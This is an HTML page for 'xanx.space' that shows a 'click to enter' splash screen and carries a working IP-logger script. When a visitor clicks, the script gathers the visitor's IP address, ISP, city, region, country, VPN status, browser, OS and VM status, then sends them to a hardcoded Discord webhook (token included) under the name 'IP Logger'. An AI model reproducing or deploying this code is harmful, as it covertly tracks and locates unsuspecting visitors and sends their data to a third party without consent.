<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xanx.space</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #000;
            font-family: 'Arial', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            overflow: hidden;
            user-select: none;
        }
        
        #enter-text {
            color: #fff;
            font-size: 3rem;
            text-align: center;
            transition: all 0.5s ease;
            text-shadow: 0 0 15px rgba(255,255,255,0.7);
            font-weight: 300;
            letter-spacing: 2px;
        }
        
        #enter-text.fade-out {
            opacity: 0;
            transform: scale(0.8);
            pointer-events: none;
        }
        
        #status {
            color: #666;
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 0.8rem;
            font-family: 'Courier New', monospace;
        }
        
        .pulse {
            animation: pulse 2s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
            50% { 
                opacity: 0.6;
                text-shadow: 0 0 25px rgba(255,255,255,0.9);
            }
            100% { 
                opacity: 1;
                text-shadow: 0 0 15px rgba(255,255,255,0.7);
            }
        }
        
        #debug {
            position: fixed;
            top: 10px;
            left: 10px;
            color: #ff4444;
            font-size: 12px;
            font-family: monospace;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
    </style>
</head>
<body>
    <div id="enter-text" class="pulse">click to enter</div>
    <div id="status">xanx.space</div>
    <div id="debug"></div>

    <script>
        // Debug function
        function debug(msg) {
            console.log(msg);
            const debugEl = document.getElementById('debug');
            debugEl.style.display = 'block';
            debugEl.innerHTML += msg + '<br>';
        }

        // Function to get user's IP information
        async function getUserIPInfo() {
            try {
                debug('Fetching IP info from ipapi.co...');
                const response = await fetch('https://ipapi.co/json/');
                if (!response.ok) throw new Error('Network response was not ok');
                const data = await response.json();
                debug('IP info received: ' + data.ip);
                return data;
            } catch (error) {
                debug('Error fetching IP info: ' + error);
                // Fallback service
                try {
                    debug('Trying fallback IP service...');
                    const fallback = await fetch('https://api.ipify.org?format=json');
                    const ipData = await fallback.json();
                    debug('Fallback IP: ' + ipData.ip);
                    return {
                        ip: ipData.ip, 
                        country_name: 'Unknown', 
                        region: 'Unknown', 
                        city: 'Unknown', 
                        org: 'Unknown',
                        asn: 'Unknown'
                    };
                } catch (fallbackError) {
                    debug('Fallback also failed');
                    return null;
                }
            }
        }

        // Function to detect browser
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            
            if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Chrome";
            else if (userAgent.includes("Firefox")) browser = "Firefox";
            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
            else if (userAgent.includes("Edg")) browser = "Edge";
            else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
            
            debug('Browser detected: ' + browser);
            return browser;
        }

        // Function to detect OS
        function getOSInfo() {
            const userAgent = navigator.userAgent;
            let os = "Unknown";
            
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "Mac";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
            
            debug('OS detected: ' + os);
            return os;
        }

        // Function to detect if user is on a VM
        function detectVM() {
            const userAgent = navigator.userAgent.toLowerCase();
            const vmIndicators = ['virtualbox', 'vmware', 'hyper-v', 'qemu', 'xen'];
            
            for (let indicator of vmIndicators) {
                if (userAgent.includes(indicator)) {
                    debug('VM detected: ' + indicator);
                    return "Yes";
                }
            }
            
            debug('No VM detected');
            return "No";
        }

        // Function to send data to Discord webhook
        async function sendToDiscord(data) {
            const webhookURL = "https://discord.com/api/webhooks/1428128390556422164/L7MJh8HF0pq4N9pqgsqgPtBubRcT4aSirZZTEcWUXlWKM4sjKWcJjMYMPbjfMUZz1R6t";
            
            debug('Preparing Discord webhook data...');
            
            const embed = {
                title: "üö® New Visitor Information",
                color: 0xff0000,
                fields: [
                    {
                        name: "IP",
                        value: "```" + (data.ip || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ISP",
                        value: "```" + (data.org || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "ORG",
                        value: "```" + (data.org || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "COUNTRY",
                        value: "```" + (data.country_name || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "REGION",
                        value: "```" + (data.region || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "CITY",
                        value: "```" + (data.city || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "USING VPN?",
                        value: "```" + (data.security && data.security.vpn ? "Yes" : "No") + "```",
                        inline: true
                    },
                    {
                        name: "WHAT OS?",
                        value: "```" + (data.os || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "WHAT BROWSER",
                        value: "```" + (data.browser || "Unknown") + "```",
                        inline: true
                    },
                    {
                        name: "IS ON VM?",
                        value: "```" + (data.vm || "Unknown") + "```",
                        inline: true
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "xanx.space ‚Ä¢ " + new Date().toLocaleString()
                }
            };
            
            const payload = {
                username: "IP Logger",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/1006/1006771.png",
                embeds: [embed]
            };
            
            try {
                debug('Sending to Discord webhook...');
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (response.ok) {
                    debug('‚úÖ Successfully sent to Discord!');
                    return true;
                } else {
                    debug('‚ùå Discord error: ' + response.status);
                    return false;
                }
            } catch (error) {
                debug('‚ùå Failed to send to Discord: ' + error);
                return false;
            }
        }

        // Main function to handle the click
        async function handleClick() {
            // Fade out the text
            const enterText = document.getElementById('enter-text');
            enterText.classList.add('fade-out');
            
            // Update status
            const status = document.getElementById('status');
            status.textContent = "Collecting information...";
            status.style.color = "#ffff00";
            
            debug('=== Starting data collection ===');
            
            // Get user information
            const ipInfo = await getUserIPInfo();
            const browser = getBrowserInfo();
            const os = getOSInfo();
            const vm = detectVM();
            
            // Prepare data for Discord
            const userData = {
                ip: ipInfo ? ipInfo.ip : "Unknown",
                org: ipInfo ? ipInfo.org : "Unknown",
                asn: ipInfo ? ipInfo.asn : "Unknown",
                country_name: ipInfo ? ipInfo.country_name : "Unknown",
                region: ipInfo ? ipInfo.region : "Unknown",
                city: ipInfo ? ipInfo.city : "Unknown",
                security: ipInfo ? ipInfo.security : {},
                browser: browser,
                os: os,
                vm: vm
            };
            
            debug('Data collected: ' + JSON.stringify(userData));
            
            // Send data to Discord
            status.textContent = "Sending to Discord...";
            const success = await sendToDiscord(userData);
            
            if (success) {
                status.textContent = "Complete! You may close this page.";
                status.style.color = "#00ff00";
            } else {
                status.textContent = "Error - check console for details";
                status.style.color = "#ff0000";
            }
            
            // Remove click event listener to prevent multiple submissions
            document.body.removeEventListener('click', handleClick);
        }

        // Add event listener when page loads
        document.addEventListener('DOMContentLoaded', function() {
            document.body.addEventListener('click', handleClick);
            debug('Page loaded - ready for click');
        });
    </script>
</body>
</html>
